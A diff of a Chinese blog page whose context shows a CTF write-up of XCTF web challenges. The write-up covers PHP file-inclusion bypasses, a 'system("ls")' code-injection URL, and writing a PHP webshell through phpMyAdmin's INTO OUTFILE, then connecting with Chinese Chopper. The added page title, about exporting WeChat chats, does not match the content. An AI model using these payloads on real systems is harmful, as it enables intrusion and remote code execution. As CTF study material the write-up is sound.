@@ -147,6 +147,21 @@
     <article id="post-XCTF-Web进阶(二)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/12/04/XCTF-Web进阶(二)/">微信聊天记录导出教程</a>
+    </h1>
+  
+
+        
+        <a href="/2019/12/04/XCTF-Web进阶(二)/" class="archive-article-date">
+  	<time datetime="2019-12-04T11:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-12-04</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="文件包含-SQL注入shell"><a href="#文件包含-SQL注入shell" class="headerlink" title="文件包含/SQL注入shell"></a>文件包含/SQL注入shell</h1><h3 id="①Web-php-include"><a href="#①Web-php-include" class="headerlink" title="①Web_php_include"></a>①Web_php_include</h3><ul>
@@ -176,10 +191,10 @@
 <li><p>while函数是匹配<code>php://</code>, 并没有做大小写过滤, 可以利用这一点绕过<code>while</code>语句, 直接进入<code>include</code>包含函数</p>
 </li>
 <li><p>利用如下, 打开burpsuite, 修改成如下数据</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/6.png" alt="6"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/6.png" alt="6"></p>
 </li>
 <li><p>看到了flag文件, 直接进行读取</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/7.png" alt="7"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/7.png" alt="7"></p>
 </li>
 </ul>
 <h5 id="2-http-127-0-0-1-本地读取"><a href="#2-http-127-0-0-1-本地读取" class="headerlink" title="2. http ://127.0.0.1 本地读取"></a>2. <font color="red">http ://127.0.0.1 本地读取</font></h5><ul>
@@ -187,12 +202,12 @@
 <p>因此就利用本地读取, 再次读取当前页面, 将操作函数赋值给hello</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/8.png" alt="8"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/8.png" alt="8"></p>
 </li>
 <li><p>利用show_source函数, 输出flag文件的值</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/9.png" alt="9"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/9.png" alt="9"></p>
 </li>
 </ul>
 <h5 id="3-data-伪协议的利用"><a href="#3-data-伪协议的利用" class="headerlink" title="3. data:// 伪协议的利用"></a>3. data:// 伪协议的利用</h5><p><font color="red">data://伪协议格式要求</font></p>
@@ -231,7 +246,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://111.198.29.45:48772/ -e *</span><br></pre></td></tr></table></figure>
 
 <p>其结果如下</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/1.png" alt="1"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/1.png" alt="1"></p>
 <p>发现, 后台, 进入后台, 发现是空密码直接回车就可以进入后台</p>
 </li>
 <li><p>发现有一个数据库是空数据库, 名字为<code>test</code></p>
@@ -243,11 +258,11 @@
 <h5 id="1-mysql写入shell"><a href="#1-mysql写入shell" class="headerlink" title="1. mysql写入shell"></a>1. mysql写入shell</h5><ul>
 <li><p>因为用目录扫描工具扫描到了, <code>phpinfo</code>, 可以搜索一下web目录</p>
 <p>control+f 搜索 <code>document_root</code></p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/2.png" alt="2"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/2.png" alt="2"></p>
 <p>这样就知道了, 一会<code>outfile</code>函数所需要的函数了</p>
 </li>
 <li><p>到<code>test</code>数据库下进行SQL插叙, 插入语句</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/3.png" alt="3"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/3.png" alt="3"></p>
 </li>
 <li><p>依次执行</p>
 <ul>
@@ -280,14 +295,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select cmd from temp into outfile &apos;/tmp/shell.php&apos;</span><br></pre></td></tr></table></figure>
 
 <p>发现成功写入</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/4.png" alt="4"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/4.png" alt="4"></p>
 </li>
 <li><p>打开菜刀, 连接尝试</p>
 <p>地址: <code>http://111.198.29.45:48772/index.php?page=../../../../tmp/shell.php</code></p>
 <p>连接密码: <code>cmd</code></p>
 </li>
 <li><p>成功发现flag</p>
-<p><img src="/2019/11/27/XCTF-Web进阶(二)/5.png" alt="5"></p>
+<p><img src="/2019/12/04/XCTF-Web进阶(二)/5.png" alt="5"></p>
 </li>
 </ul>
 <h5 id="2-日志拿-shell"><a href="#2-日志拿-shell" class="headerlink" title="2. 日志拿 shell"></a>2. 日志拿 shell</h5><ul>
@@ -313,11 +328,22 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/27/XCTF-Web进阶(二)/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/12/04/XCTF-Web进阶(二)/">展开全文 >></a>
         </p>
       
 
@@ -1156,11 +1182,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
+                <a href="javascript:void(0)" class="js-tag color2">计算机小技巧</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">计算机小技巧</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
               </li>
              
               <li class="article-tag-list-item">
